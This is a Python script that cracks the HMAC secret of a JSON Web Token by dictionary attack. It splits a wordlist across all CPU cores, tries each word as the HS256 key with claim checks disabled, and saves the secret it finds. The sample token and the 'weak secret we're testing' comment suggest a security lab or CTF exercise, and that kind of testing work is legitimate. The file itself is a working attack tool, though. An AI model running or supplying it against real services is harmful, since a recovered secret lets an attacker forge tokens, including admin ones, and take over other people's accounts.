import jwt
import multiprocessing
import config

# --- Hardcoded values ---
#token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.65p5LcnatdJct3NuuJgI9STNAB3UipZK91sQzU1m1ww"
# secret = "secret"  # The weak secret we're testing


def split_into_chunks(lines, num_chunks):
    k, m = divmod(len(lines), num_chunks)
    return [lines[i * k + min(i, m):(i + 1) * k + min(i + 1, m)] for i in range(num_chunks)]


def check_the_token(wordlist, result_queue):
    for word in wordlist:
        try:
            decoded = jwt.decode(config.token, word, algorithms=["HS256"], options={
	        "verify_aud": False,
	        "verify_iss": False,
	        "verify_exp": False,
	        "verify_nbf": False,
	        })
            print("Signature is valid.")
            print(decoded)
            result_queue.put(word) # found the secret push it on the queue
            return
        except jwt.InvalidSignatureError:
            # print("Invalid signature.")
            continue
            
        # if word == "JwtYourSecretStoreKey":
        #     result_queue.put(word)
        #     return


def bruteforce_the_jwt():

    number_of_processes = multiprocessing.cpu_count()
    print(f"Number of CPU cores found: {number_of_processes}")

    with open(config.wordlist, 'r') as wordlist:
        lines = [line.strip() for line in wordlist.readlines()]

    # print(f"the file contains {len(lines)} lines")
    # print(lines)
    chunk_size = len(lines) // number_of_processes
    chunks = split_into_chunks(lines, number_of_processes)

    #print(chunks)
    processes = [] # this list will have processess

    result_queue = multiprocessing.Queue()

    for chunk in chunks:
        p = multiprocessing.Process(target=check_the_token, args=(chunk, result_queue))
        p.start()
        processes.append(p)

    # wait for a result or match
    found = None
    try:
        found = result_queue.get(timeout=10)  # Wait for first match
    except:
        pass

    # Terminate all processes (whether found or not)
    for p in processes:
        p.terminate()
        p.join()

    if found:
        config.secret_value = found.strip()
        print("Secret Found:", config.secret_value)
        input("press Enter to continue..")
    else:
        print("Secret not found.")


# if __name__ == "__main__":
#     bruteforce_the_jwt()